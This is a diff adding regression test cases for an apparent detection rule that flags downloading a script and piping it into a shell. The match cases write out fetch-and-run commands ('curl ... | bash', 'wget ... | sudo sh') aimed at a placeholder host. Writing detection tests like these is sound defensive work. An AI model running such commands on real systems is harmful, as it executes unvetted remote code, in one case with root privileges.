@@ -1,0 +1,24 @@
+# Regression cases for aegis-lnx-curl-pipe-shell. Events are completed with defaults by the test runner.
+rule: aegis-lnx-curl-pipe-shell
+match:
+- process:
+    pid: 2
+    name: bash
+    executable: /bin/bash
+    command_line: bash -c curl -fsSL http://x.test/i.sh | bash
+- process:
+    pid: 2
+    name: sh
+    executable: /bin/sh
+    command_line: sh -c wget -qO- http://x.test/a | sudo sh
+no_match:
+- process:
+    pid: 2
+    name: curl
+    executable: /usr/bin/curl
+    command_line: curl -o out.tar.gz https://x.test/a.tgz
+- process:
+    pid: 2
+    name: bash
+    executable: /bin/bash
+    command_line: bash -c 'curl x | shasum'
